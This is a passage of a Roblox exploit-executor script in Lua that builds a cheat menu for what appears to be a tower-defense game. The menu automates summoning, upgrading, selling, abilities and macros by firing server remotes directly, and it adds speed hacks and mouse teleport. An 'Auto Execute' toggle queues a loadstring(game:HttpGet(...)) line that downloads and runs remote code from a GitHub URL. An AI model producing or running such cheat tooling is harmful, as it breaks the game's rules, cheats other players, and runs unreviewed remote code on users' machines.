    Name = "Slot 2: "..game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.Two.Unit.Value,
    Default = false,
    Callback = function(Value)
    _G.unit2 = Value
    end
})

PriorityTab:AddToggle({
    Name = "Slot 3: "..game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.Three.Unit.Value,
    Default = false,
    Callback = function(Value)
    _G.unit3 = Value
    end
})

PriorityTab:AddToggle({
    Name = "Slot 4: "..game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.Four.Unit.Value,
    Default = false,
    Callback = function(Value)
    _G.unit4 = Value
    end
})

PriorityTab:AddToggle({
    Name = "Slot 5: "..game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.Five.Unit.Value,
    Default = false,
    Callback = function(Value)
    _G.unit5 = Value
    end
})

PriorityTab:AddToggle({
    Name = "Slot 6: "..game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.Six.Unit.Value,
    Default = false,
    Callback = function(Value)
    _G.unit6 = Value
    end
})

--MacroTab

MacroTab:AddToggle({
    Name = "Auto 2x",
    Default = _G.SettingsTable.auto2x,
    Callback = function(Value)
    _G.SettingsTable.auto2x = Value
    auto2x()
    end
})

MacroTab:AddToggle({
    Name = "Auto Extreme",
    Default = _G.SettingsTable.autoextreme,
    Callback = function(Value)
    _G.SettingsTable.autoextreme = Value
    autoextreme()
    end
})

MacroTab:AddToggle({
    Name = "Auto Replay",
    Default = _G.SettingsTable.autoreplay,
    Callback = function(Value)
    _G.SettingsTable.autoreplay = Value
    autoreplay()
    end
})
MacroTab:AddToggle({
    Name = "Force tp lobby if replay tp fails",
    Default = _G.SettingsTable.forcetp,
    Callback = function(Value)
_G.SettingsTable.forcetp = Value
SaveSettings()
if _G.SettingsTable.forcetp then
coroutine.resume(coroutine.create(function()
game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("MissionEndNavigateDialog"):WaitForChild("TextFrame"):WaitForChild("Replay")
local x = 0
repeat x = x + 1 wait(1) until x == 60 or _G.SettingsTable.forcetp == false
if _G.SettingsTable.forcetp then
game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer)
end
end))
end
end
})

MacroTab:AddToggle({
    Name = "Auto Sell",
    Default = _G.SettingsTable.autosell,
    Callback = function(Value)
    _G.SettingsTable.autosell = Value
    autosell()
    end
})

MacroTab:AddTextbox({
	Name = "Auto Sell After Wave",
	Default = tostring(_G.SettingsTable.autosellwave),
	TextDisappear = false,
	Increment = 1,
	Callback = function(Value)
	    _G.SettingsTable.autosellwave = Value
	    SaveSettings()
	end    
})

MacroTab:AddTextbox({
    Name = "Auto Sell Speed",
    Default = _G.SettingsTable.autosellspeed,
    TextDisappear = false,
    Callback = function(Value)
        _G.SettingsTable.autosellspeed = Value
        SaveSettings()
    end
})

MacroTab:AddToggle({
    Name = "Record Macro",
    Default = false,
    Callback = function(Value)
    _G.record = Value
    record()
    end
})


MacroTab:AddToggle({
    Name = "Playback Macro",
    Default = _G.SettingsTable.autoplayback,
    Callback = function(Value)
    _G.SettingsTable.autoplayback = Value
    playback()
    end
})

MacroTab:AddSection({
	Name = "  Playback starts when there is 1 second(s) left in the ext/normal"
})

MacroTab:AddToggle({
    Name = "Playback summons and upgrades with a timer",
    Default = _G.SettingsTable.timer,
    Callback = function(Value)
    _G.SettingsTable.timer = Value
    autosell()
    end
})

MacroTab:AddTextbox({
    Name = "Save Macro Profile",
    Default = "DefaultProfile",
    TextDisappear = false,
    Callback = function(Value)
        if Value ~= "" then
        for i, v in pairs(macrolist) do
            if v == Value then table.remove(macrolist, i) end
        end
            table.insert(macrolist, Value .. '.json')
        writefile(macrofolder .. '/' .. Value .. '.json', "[]")
        end
        for i, v in pairs(game:GetService("CoreGui").Orion:GetDescendants()) do
            pcall(function()
            if v.Text == 'Select Macro' then
                v.Parent.Parent:Destroy()
            end
            end)
        end
        MacroTab:AddDropdown({
            Name = "Select Macro",
            Default = _G.SettingsTable.selectedmacro,
            Options = macrolist,
            Callback = function(Value)
                _G.SettingsTable.selectedmacro = Value
                SaveSettings()
            end
            }) 
        SaveSettings()
    end
})
MacroTab:AddButton({
	Name = "Refresh macro list",
	Default = false,
	Callback = function(Value)
	    table.clear(macrolist)
        for i,v in pairs(listfiles(macrofolder .. '/')) do
            table.insert(macrolist, string.sub(v, v:find('/') + 1))
        end
        for i, v in pairs(game:GetService("CoreGui").Orion:GetDescendants()) do
            pcall(function()
            if v.Text == 'Select Macro' then
                v.Parent.Parent:Destroy()
            end
            end)
        end
        MacroTab:AddDropdown({
            Name = "Select Macro",
            Default = _G.SettingsTable.selectedmacro,
            Options = macrolist,
            Callback = function(Value)
                _G.SettingsTable.selectedmacro = Value
                SaveSettings()
            end
            }) 
    end
})
MacroTab:AddButton({
	Name = "Delete Selected Macro",
	Default = false,
	Callback = function(Value)
	    for i, v in pairs(macrolist) do
	        if v == _G.SettingsTable.selectedmacro then
	            table.remove(macrolist, i)
	            delfile(macrofolder .. '/' .. _G.SettingsTable.selectedmacro)
	        end
	        SaveSettings()
	    end
	    for i, v in pairs(game:GetService("CoreGui").Orion:GetDescendants()) do
            pcall(function()
            if v.Text == 'Select Macro' then
                v.Parent.Parent:Destroy()
            end
            end)
        end
        MacroTab:AddDropdown({
            Name = "Select Macro",
            Default = _G.SettingsTable.selectedmacro,
            Options = macrolist,
            Callback = function(Value)
                _G.SettingsTable.selectedmacro = Value
                SaveSettings()
            end
        }) 
	end
})



MacroTab:AddDropdown({
    Name = "Select Macro",
    Default = _G.SettingsTable.selectedmacro,
    Options = macrolist,
    Callback = function(Value)
        _G.SettingsTable.selectedmacro = Value
    end
})


--SupportTab

BuffTab:AddToggle({
	Name = "Brook/Erwin",
	Default = _G.SettingsTable.autobufftoggle,
	Callback = function(Value)
        _G.SettingsTable.autobufftoggle = Value
        autobrookerwin()
	end    
})

BuffTab:AddToggle({
	Name = "Merlin",
	Default = _G.SettingsTable.automerlintoggle,
	Callback = function(Value)
        _G.SettingsTable.automerlintoggle = Value
        automerlin()
	end    
})

BuffTab:AddSection({
	Name = "  Works for 4 or 8 Brooks/Erwins, Order: 1324"
})

BuffTab:AddToggle({
	Name = "Auto FV",
	Default = _G.SettingsTable.autofv,
	Callback = function(Value)
        _G.SettingsTable.autofv = Value
        autofv()
	end    
})


--UpgradeTab

UpgradeTab:AddToggle({
	Name = "Auto Upgrade",
	Default = _G.SettingsTable.autoupgrade,
	Callback = function(Value)
        _G.SettingsTable.autoupgrade = Value
        autoupgrade()
	end    
})

UpgradeTab:AddTextbox({
	Name = "Auto Upgrade After Wave",
	Default = tostring(_G.SettingsTable.autoupgradewave),
	TextDisappear = false,
	Increment = 1,
	Callback = function(Value)
	    _G.SettingsTable.autoupgradewave = Value
	    SaveSettings()
	end    
})

UpgradeTab:AddToggle({
	Name = "Upgrade Gojo",
	Default = false,
	Callback = function(Value)
        _G.autogojo = Value
	end    
})

UpgradeTab:AddSection({
	Name = "  Fully maxes Gojo only when you place him down"
})

UpgradeTab:AddToggle({
	Name = "Upgrade Law (Upgrade 6)",
	Default = false,
	Callback = function(Value)
        _G.lawupgrade = Value
	end    
})

UpgradeTab:AddSection({
	Name = "  Upgrades Law up to Upgrade 6 only (Not Maxed)"
})

UpgradeTab:AddToggle({
	Name = "Farm Upgrade",
	Default = false,
	Callback = function(Value)
        _G.farmupgrade = Value
        farmupgrade()
	end    
})

UpgradeTab:AddSection({
	Name = "  Automatically upgrades Speedwagon and Bulma"
})

UpgradeTab:AddSection({
	Name = "  Place both farms first before starting (Made for inf runs)"
})

UpgradeTab:AddSection({
	Name = "  Prioritises Speedwagon over Bulma"
})

--AbilityTab

AbilityTab:AddToggle({
	Name = "Auto TS",
	Default = _G.SettingsTable.autots,
	Callback = function(Value)
        _G.SettingsTable.autots = Value
        SaveSettings()
        coroutine.resume(coroutine.create(function()
        if _G.SettingsTable.autots and _G.SettingsTable.autotswave ~= "" and game:GetService("ReplicatedStorage").Lobby.Value == false then
            local Event1 = game:GetService("ReplicatedStorage").Remotes.Server
            local Event = game:GetService("ReplicatedStorage").Remotes.Input
            wait()
            local pathnumber = {}
            coroutine.resume(coroutine.create(function()
            repeat wait()
            for _, v in pairs(game.Workspace.Enemies:GetChildren()) do
            if #pathnumber ~= 0 then
            local success = 
            pcall(function()
            if v:WaitForChild("PathNumber").Value > pathnumber[1].PathNumber.Value then
            table.clear(pathnumber)
            table.insert(pathnumber, v)
            end
            end)
            if success == false then
            pcall(function()
            table.clear(pathnumber)
            table.insert(pathnumber, v)
            end)
            end
            else
            pcall(function()
            table.clear(pathnumber)
            table.insert(pathnumber, v)
            end)
            end
            end
            until _G.SettingsTable.autots == false
            end))
            coroutine.resume(coroutine.create(function()
            repeat wait()
            pcall(function()
            summonpart.CFrame = pathnumber[1].REALPOSITIONPOS.Value
            end)
            until _G.SettingsTable.autots == false
            end))
            repeat wait() until #game.Workspace.Enemies:GetChildren() > 0 and game:GetService("ReplicatedStorage").WaveValue.Value >= tonumber(_G.SettingsTable.autotswave)
            wait(2)
            while _G.SettingsTable.autots do
            repeat wait() until #game.Workspace.Enemies:GetChildren() > 0
            local tsvalue = false
            coroutine.resume(coroutine.create(function()
                if _G.SettingsTable.autots then
                    repeat wait()
                        local a1 = pcall(function()
                            if pathnumber[1]:FindFirstChild("Status_Effect_Freeze") then
                                tsvalue = false
                            else tsvalue = true end
                        end)
                    until _G.SettingsTable.autots == false
                end
            end))
            if _G.SettingsTable.autots and #game.Workspace.Enemies:GetChildren() > 0 then
            repeat
            Event:FireServer('Summon', {
                ["Rotation"] = 0, 
                ["cframe"] = game.Workspace.SummonBox.CFrame * CFrame.new(math.random(-game.Workspace.SummonBox.Size.X/2, game.Workspace.SummonBox.Size.X/2),math.random(-game.Workspace.SummonBox.Size.Y/2, game.Workspace.SummonBox.Size.Y/2),math.random(-game.Workspace.SummonBox.Size.Z/2, game.Workspace.SummonBox.Size.Z/2)), 
                ["Unit"] = "Six Eyes Gojo"
            })
            wait(1)
            until gojoplaced or _G.SettingsTable.autots == false
            gojoplaced = false
            if _G.SettingsTable.autots then
            repeat wait()
                pcall(function()
                Event1:InvokeServer('Upgrade', autotstable[1])
                end)
            until autotstable[1]:WaitForChild('UpgradeTag').Value == autotstable[1].MaxUpgradeTag.Value or _G.SettingsTable.autots == false
            end
            if _G.SettingsTable.autots then
            pcall(function()
            repeat wait() until tsvalue
                repeat wait()
                Event:FireServer('UseSpecialMove', autotstable[1])
                until tsvalue == false or _G.SettingsTable.autots or autotstable[1].SpecialMove.Special_Enabled2.Value
            end)
            end
            if autotstable[1].StunBoolean.Value then wait(2) end
            if _G.SettingsTable.autots then
                pcall(function()
                    repeat wait()
                        Event:FireServer('Sell', autotstable[1])
                    until autotstable[1].UpgradeTag.Value == -1 or _G.SettingsTable.autots == false
                end)
            end
            end
            end
        end
    end))
	end    
})

AbilityTab:AddTextbox({
	Name = "Auto TS After Wave",
	Default = _G.SettingsTable.autotswave,
	TextDisappear = true,
	Callback = function(Value)
	    if Value ~= "" then
        _G.SettingsTable.autotswave = Value
	    SaveSettings()
        end
	end    
})

AbilityTab:AddToggle({
	Name = "Law Ability",
	Default = false,
	Callback = function(Value)
        _G.lawability = Value
	end    
})

AbilityTab:AddBind({
	Name = "Law Bind",
	Default = Enum.KeyCode.F1,
	Hold = false,
	Callback = function()
	    lawability()
	end    
})

AbilityTab:AddSection({
	Name = ""
})

AbilityTab:AddButton({
	Name = "Yugi 4 Cards (Auto)",
	Default = false,
	Callback = function()
        click73()
	end    
})

AbilityTab:AddToggle({
	Name = "Yugi Ability",
	Default = false,
	Callback = function(Value)
        _G.yugiability = Value
	end    
})

AbilityTab:AddBind({
	Name = "Yugi Bind",
	Default = Enum.KeyCode.F3,
	Hold = false,
	Callback = function()
	    yugiability()
	end    
})

AbilityTab:AddToggle({
	Name = "Auto Cooler",
	Default = _G.SettingsTable.autocooler,
	Callback = function(Value)
        _G.SettingsTable.autocooler = Value
        autocooler()
	end    
})

AbilityTab:AddSection({
	Name = ""
})

AbilityTab:AddToggle({
	Name = "Light (Kira) Ability",
	Default = false,
	Callback = function(Value)
        _G.kiraability = Value
	end    
})

AbilityTab:AddBind({
	Name = "Light Bind",
	Default = "",
	Hold = false,
	Callback = function()
	    kiraability()
	end    
})

AbilityTab:AddSection({
	Name = ""
})

AbilityTab:AddToggle({
	Name = "Ryuk Ability",
	Default = false,
	Callback = function(Value)
        _G.ryukability = Value
	end    
})

AbilityTab:AddBind({
	Name = "Ryuk Bind",
	Default = "",
	Hold = false,
	Callback = function()
	    ryukability()
	end    
})

--MobCounterTab

MobCounterTab:AddButton({
	Name = "Mob Counter: 1 Time Click",
	Default = false,
	Callback = function(Value)
        _G.click69 = Value
        click69()
	end    
})

MobCounterTab:AddToggle({
	Name = "Auto Mob Notifacation",
	Default = false,
	Callback = function(Value)
        _G.mobnotifacation = Value
        mobnotifacation()
	end    
})

MobCounterTab:AddSection({
	Name = "  Loops Mobs Notifacations until you want it to stop"
})

MobCounterTab:AddSection({
	Name = ""
})

MobCounterTab:AddSection({
	Name = "  Notifacation settings below:"
})

MobCounterTab:AddSlider({
	Name = "Notifacation Interval (1-30 sec)",
	Min = 1,
	Max = 30,
	Default = 5,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	Callback = function(Value)
		mobslider = Value
	end    
})

MobCounterTab:AddSection({
	Name = "  How long you have to wait until another notifacation"
})

MobCounterTab:AddSlider({
	Name = "Notifacation Delay",
	Min = 1,
	Max = 30,
	Default = 5,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	Callback = function(Value)
		mobslider1 = Value
	end    
})

MobCounterTab:AddSection({
	Name = "  How long the notifacations will stay on the screen"
})

SettingsTab:AddButton({
	Name = "Destroy UI",
	Default = false,
	Callback = function(Value)
        _G.click70 = Value
        click70()
	end    
})

local autoex = 0

SettingsTab:AddToggle({
    Name = "Auto Execute (Click Once)",
    Default = _G.SettingsTable.autoexecute,
    Callback = function(Value)
        _G.SettingsTable.autoexecute = Value
        if _G.SettingsTable.autoexecute and autoex == 0 then autoex = autoex + 1
        local queue_on_teleport = queue_on_teleport or syn and syn.queue_on_teleport [[
        loadstring(game:HttpGet('https://raw.githubusercontent.com/HelloHiPro/HelloHiPro/main/New_Text_Document.lua'))()]]
	end
	SaveSettings()
    end    
})

SettingsTab:AddToggle({
	Name = "Player Speed",
	Default = false,
	Callback = function(Value)
	    _G.click71 = Value
        click71()
	end    
})

SettingsTab:AddSlider({
	Name = "Speed",
	Min = 1,
	Max = 100,
	Default = 5,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	Callback = function(Value)
		TargetWalkspeed = Value
	end    
})

SettingsTab:AddToggle({
	Name = "Destroy Name (Hides Name)",
	Default = _G.SettingsTable.hidenick,
	Callback = function(Value)
	    _G.SettingsTable.hidenick = Value
	    SaveSettings()
	    if Value then
	        coroutine.resume(coroutine.create(function()
	                pcall(function()
	                    game.Workspace.Camera:WaitForChild(game.Players.LocalPlayer.Name)
	                    wait(1)
                        plrlevel = game:GetService("Workspace"):WaitForChild("Camera")[me.Name]:WaitForChild("Head"):WaitForChild("NameLevelBBGUI"):WaitForChild("LevelFrame"):WaitForChild("TextLabel").Text
                        game:GetService("Workspace"):WaitForChild("Camera")[me.Name]:WaitForChild("Head"):WaitForChild("NameLevelBBGUI"):WaitForChild("LevelFrame"):WaitForChild("TextLabel"):Destroy()
                        game:GetService("Workspace"):WaitForChild("Camera")[me.Name]:WaitForChild("Head"):WaitForChild("NameLevelBBGUI"):WaitForChild("LevelFrame"):WaitForChild("ImageLabel"):Destroy()
                        game:GetService("Workspace"):WaitForChild("Camera")[me.Name]:WaitForChild("Head"):WaitForChild("NameLevelBBGUI"):WaitForChild("NameFrame"):WaitForChild("TextLabel"):Destroy()
                        game:GetService("Workspace"):WaitForChild("Camera")[me.Name]:WaitForChild("Head"):WaitForChild("NameLevelBBGUI"):WaitForChild("Top"):WaitForChild("ImageLabel"):Destroy()
	                end)
	        end))
        end
    end
})

SettingsTab:AddToggle({
	Name = "Shift-Lock",
	Default = _G.SettingsTable.shiftlock,
	Callback = function(Value)
	    _G.SettingsTable.shiftlock = Value
	    SaveSettings()
	    if Value then
            game:GetService('Players').LocalPlayer.DevEnableMouseLock = true
        else 
            game:GetService('Players').LocalPlayer.DevEnableMouseLock = false
        end
	end    
})

SettingsTab:AddToggle({
	Name = "Change Clock Time",
	Default = _G.SettingsTable.changeclocktime,
	Callback = function(Value)
        _G.SettingsTable.changeclocktime = Value
	SaveSettings()
	end   
})

SettingsTab:AddSlider({
	Name = "Clock Time",
	Min = 1,
	Max = 24,
	Default = _G.SettingsTable.clocktime,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	Callback = function(Value)
	_G.SettingsTable.clocktime = Value
	    if _G.SettingsTable.changeclocktime then
                game:GetService('Lighting').ClockTime = _G.SettingsTable.clocktime
	    end
	SaveSettings()
	end
})

SettingsTab:AddToggle({
	Name = "Mouse Teleport",
	Default = false,
	Callback = function(Value)
        _G.mousetp = Value
	end    
})

SettingsTab:AddBind({
	Name = "Teleport Bind",
	Default = "",
	Hold = false,
	Callback = function()
	    mousetp()
	end    
})

SettingsTab:AddToggle({
	Name = "Buff FPS (Delete Textures)",
	Default = _G.SettingsTable.deletetexture,
	Callback = function(Value)
    _G.SettingsTable.deletetexture = Value
    SaveSettings()
if _G.SettingsTable.deletetexture then
pcall(function()
local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
local g = game
local w = g.Workspace
local l = g.Lighting
local t = w.Terrain
t.WaterWaveSize = 0
t.WaterWaveSpeed = 0
t.WaterReflectance = 0
t.WaterTransparency = 0
l.GlobalShadows = false
l.FogEnd = 9e9
l.Brightness = 0
settings().Rendering.QualityLevel = "Level01"
for i, v in pairs(g:GetDescendants()) do
    if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
    elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
        v.Transparency = 1
    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
        v.Lifetime = NumberRange.new(0)
    elseif v:IsA("Explosion") then
        v.BlastPressure = 1
        v.BlastRadius = 1
    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") then
        v.Enabled = false
    elseif v:IsA("MeshPart") then
        if v.Parent == game:GetService("ReplicatedStorage").SphereSelection then print("Skipped")
        else
        v.Material = "Plastic"
        v.Reflectance = 0
        v.TextureID = 10385902758728957
        end
    end
end
for i, e in pairs(l:GetChildren()) do
    if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
        e.Enabled = false
    end
end
end)
end
end    
})

SettingsTab:AddToggle({
	Name = "Delete Enemy (FPS)",
	Default = _G.SettingsTable.deleteenemy,
	Callback = function(Value)
        _G.SettingsTable.deleteenemy = Value
        SaveSettings()
	end    
})

SettingsTab:AddToggle({
	Name = "Set Fps Cap",
	Default = _G.SettingsTable.setfpscap,
	Callback = function(Value)
        _G.SettingsTable.setfpscap = Value
        SaveSettings()
        coroutine.resume(coroutine.create(function()
        if _G.SettingsTable.setfpscap then
            repeat wait() until string.match(game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild('HUD').ModeVoteFrame.Seconds.Text, "%d+") == "1"
            setfpscap(_G.SettingsTable.fpscap)
            repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild('MissionEndNavigateDialog'):WaitForChild('TextFrame'):WaitForChild('Replay') or _G.SettingsTable.setfpscap == false
            setfpscap(30)
        else setfpscap(60)
        end
        end))
	end
})

SettingsTab:AddSlider({
	Name = "Fps Cap",
	Min = 1,
	Max = 240,
	Default = _G.SettingsTable.fpscap,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	Callback = function(Value)
		_G.SettingsTable.fpscap = Value
		SaveSettings()
	end    
})

OrionLib:Init()
